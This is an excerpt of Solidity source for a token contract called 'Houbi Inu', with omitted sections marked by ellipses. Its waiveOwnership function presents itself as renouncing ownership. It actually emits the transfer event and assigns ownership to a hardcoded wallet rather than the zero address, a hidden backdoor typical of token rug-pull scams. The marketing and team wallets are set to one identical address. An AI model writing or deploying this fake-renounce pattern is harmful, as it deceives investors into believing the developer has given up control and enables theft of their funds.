...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xdcA7E477cFCF9d87e4617ceDacaD9860E747FeBa));
        _owner = address(0xdcA7E477cFCF9d87e4617ceDacaD9860E747FeBa);
    }
...
contract HoubiInu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Houbi Inu";
    string private _symbol = "HoubiInu";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xD38906886Bd00c29b64182D6381300677Fd2ec6C);
    address payable public teamWalletAddress = payable(0xD38906886Bd00c29b64182D6381300677Fd2ec6C);
